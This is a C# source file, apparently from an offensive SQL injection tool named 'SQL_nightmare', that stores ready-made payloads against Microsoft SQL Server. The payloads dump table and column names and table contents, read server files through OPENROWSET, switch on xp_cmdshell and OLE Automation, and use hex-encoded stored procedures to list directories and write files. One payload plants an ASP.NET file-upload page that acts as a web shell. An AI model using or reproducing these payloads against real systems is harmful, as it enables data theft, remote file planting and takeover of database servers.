using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace SQL_nightmare
{
    class QueriesDB
    {
        public static string Replacement = "ch198mno574x";

        public static string TableStackedQuery = ";begin declare @x varchar(MAX) set @x = 'x102x' SELECT @x = @x %2b ':' %2b TABLE_NAME FROM INFORMATION_SCHEMA.TABLES set @x = @x %2b ':x102y' SELECT @x as oxp into xrummyTables end--X-";
        public static string ColumnStackedQuery = ";begin declare @x varchar(MAX) set @x = 'x102x' SELECT @x = @x %2b':'%2b COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = [TABLENAME]; set @x = @x %2b':x102y' SELECT @x as oxp into xrummyTables end--X-";
        public static string DropTableStackedQuery = ";drop table xrummyTables--X-";
        public static string TableDumpQuery = "'x102x:'%2b(SELECT * FROM [TABLENAME] for xml auto)%2b':x102y'";

        public static string DirListingFuncQuery = ";begin declare @x varchar(MAX) SET @x = 0x4352454154452046554e4354494f4e204469722840776320564152434841522838303030292952455455524e5320406d64205441424c45285b706174685d205641524348415228323030302929415320424547494e204445434c41524520407a20494e542c407220494e542c406a20494e542c406220494e542c406c20494e542c407420564152434841522831303030292c406320564152434841522831303030292c406520494e542c407720494e542c406720494e542c4070617468205641524348415228323030302920455845435554452040653d73705f4f4143726561746520275368656c6c2e4170706c69636174696f6e272c407a204f55542049462040653d302053454c4543542040623d407a2c2040633d274e616d6553706163652822272b4077632b272229272049462040653d302020455845435554452040653d73705f4f414d6574686f6420407a2c40632c4072204f55542053454c4543542040623d40722c2040633d274974656d732e436f756e74272049462040653d3020455845435554452040653d73705f4f414d6574686f642040722c2040632c204077204f55542049462040653d302053454c4543542040623d40722c2040633d276974656d732829272049462040653d302020455845435554452040653d73705f4f414d6574686f642040722c40632c406c204f55545055542053454c4543542040673d30205748494c452040653d3020414e442040673c20407720424547494e2049462040653d302053454c4543542040623d406c2c2040633d276974656d28272b434153542840672041532056415243484152283529292b2729272049462040653d3020455845435554452040653d73705f4f414d6574686f6420406c2c2040632c20406a204f55545055542049462040653d302053454c4543542040623d406a2049462040653d3020455845435554452040653d73705f4f414d6574686f6420406a2c2770617468272c204070617468204f555450555420494e5345525420494e544f20406d642870617468292053454c4543542040706174682049462040653d302053454c4543542040673d40672b3120454e442052455455524e20454e44 EXEC(@x)end--X-";
        public static string ConfirmDirFuncQuery = "'x102x:'%2b(select name from sys.objects where name='dir')%2b':x102y'";
        public static string ReadDirWithFuncQuery = "'x102x:'%2b(select path from dir('[DIR]') as dir for xml auto)%2b':x102y'";
        
        public static string ReadFileOpenRowSetQuery = "'x102x:'%2b(cast((select bulkcolumn from OPENROWSET(BULK '[FILENAME]', SINGLE_BLOB) AS x)as varchar(MAX)))%2b':x102y'";
        public static string DropFuncQuery = ";drop function dir--X-";

        public static string UploadFileProcQuery = ";begin declare @x varchar(MAX) SET @x=0x4352454154452050524f434544555245204663556b284073742056617263686172286d6178292c4070205641524348415228323535292c40666e20564152434841522831303029294153204445434c4152452020406f667320696e742c406f747320696e742c406f656f20696e742c4073656d20566172636861722831303030292c40636d6420766172636861722831303030292c406820696e742c40666e70207661726368617228383029736574206e6f636f756e74206f6e2073656c656374204073656d3d276f272045584543555445204068203d2073705f4f41437265617465202027536372697074696e672e46696c6553797374656d4f626a656374272c20406f6673204f55542053656c6563742040666e703d40702b275c272b40666e2069662040683d302053656c65637420406f656f3d406f6673202c204073656d3d274372656174696e672066696c652022272b40666e702b2722272069662040683d3020657865637574652040683d73705f4f414d6574686f6420406f66732c274372656174655465787446696c65272c406f7473204f55542c40666e702c322c547275652069662040683d302053656c65637420406f656f3d406f74732c204073656d3d27777474662022272b40666e702b2722272069662040683d3020657865637574652040683d73705f4f414d6574686f642020406f74732c20275772697465272c204e756c6c2c204073742069662040683d302053656c65637420406f656f3d406f74732c204073656d3d276374662022272b40666e702b2722272069662040683d3020657865637574652040683d73705f4f414d6574686f642020406f74732c2027436c6f7365272069662040683c3e3020626567696e204465636c6172652040737263207661726368617228323535292c40646573205661726368617228323535292c40686c66205661726368617228323535292c4048656c70494420696e7420455845435554452073705f4f414765744572726f72496e666f2020406f656f2c2040737263206f75747075742c40646573206f75747075742c40686c66206f75747075742c4048656c704944206f757470757420656e64;EXEC(@x);end--X-";
        public static string ConfirmFcUkProcQuery = "'x102x:'%2b(select name from sys.objects where name='FcUk')%2b':x102y'";
        public static string DropFcUkProcQuery = ";drop proc FcUk--X-";

        public static string FileUploadingQueryFAKE = ";begin declare @x varchar(MAX) SET @x=0x72756d6d796b686163c2f666f726d3e  exec FcUk @x,'[PATH]','[FILENAME]' end--X-";
        public static string FileUploadingQueryREAL = ";begin declare @x varchar(MAX) SET @x=0x72756d6d796b68616e3c25402050616765204c616e67756167653d224323222044656275673d2266616c7365222074726163653d2266616c7365222076616c6964617465526571756573743d2266616c73652220456e61626c655669657753746174654d61633d2266616c73652220456e61626c655669657753746174653d227472756522253e3c7363726970742072756e61743d22736572766572223e70726f74656374656420766f69642075706c5f436c69636b286f626a6563742073656e6465722c204576656e7441726773206529207b7472797b6966202866752e48617346696c65297b66752e536176654173285365727665722e4d61705061746828222e2229202b225c5c222b2053797374656d2e494f2e506174682e47657446696c654e616d652866752e46696c654e616d6529293b526573706f6e73652e577269746528225375636365737322293b7d7d63617463687b526573706f6e73652e577269746528224661696c656422293b7d7d203c2f7363726970743e3c666f726d2069643d22666f726d31222072756e61743d22736572766572223e3c6173703a46696c6555706c6f61642049443d226675222072756e61743d2273657276657222202f3e3c6173703a427574746f6e2049443d2275706c222072756e61743d227365727665722220546578743d2255706c6f616422204f6e436c69636b3d2275706c5f436c69636b22202f3e3c2f666f726d3e  exec FcUk @x,'[PATH]','[FILENAME]' end--X-";

        public static string EnableOLEAutomation = ";EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE--X-";
        public static string EnableXPCMDShell = ";show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--X-";

        public static void initialize()
        {
            if (File.Exists("config.xml"))
            {
                XmlDocument xDoc = new XmlDocument();
                xDoc.Load("config.xml");
                string tableStackedQuery = xDoc.GetElementsByTagName("tableStackedQuery")[0].InnerXml.Trim();
                string columnStackedQuery = xDoc.GetElementsByTagName("columnStackedQuery")[0].InnerXml.Trim();
                string dropTableStackedQuery = xDoc.GetElementsByTagName("dropTableStackedQuery")[0].InnerXml.Trim();
                string tableDumpQuery = xDoc.GetElementsByTagName("tableDumpQuery")[0].InnerXml.Trim();

                if (!String.IsNullOrEmpty(tableStackedQuery))
                    TableStackedQuery = tableStackedQuery;
                if (!String.IsNullOrEmpty(columnStackedQuery))
                    ColumnStackedQuery = columnStackedQuery;
                if (!String.IsNullOrEmpty(dropTableStackedQuery))
                    DropTableStackedQuery = dropTableStackedQuery;
                if (!String.IsNullOrEmpty(tableDumpQuery))
                    TableDumpQuery = tableDumpQuery;
            }
        }
    }
}
